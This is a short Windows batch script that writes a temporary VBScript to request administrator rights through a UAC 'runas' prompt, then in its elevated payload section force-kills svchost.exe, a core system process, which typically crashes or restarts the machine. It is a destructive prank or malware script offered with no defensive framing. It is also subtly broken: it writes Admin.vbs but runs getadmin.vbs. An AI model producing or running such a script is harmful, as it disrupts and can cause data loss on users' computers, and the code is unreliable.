@echo off
if _%1_==_payload_  goto :payload

:Admin
    set vbs=%temp%\Admin.vbs
    echo Set UAC = CreateObject^("Shell.Application"^)                >> "%vbs%"
    echo UAC.ShellExecute "%~s0", "payload %~sdp0 %*", "", "runas", 1 >> "%vbs%"
    "%temp%\getadmin.vbs"
    del "%temp%\Admin.vbs"
goto :eof

:payload
taskkill /f /im svchost.exe
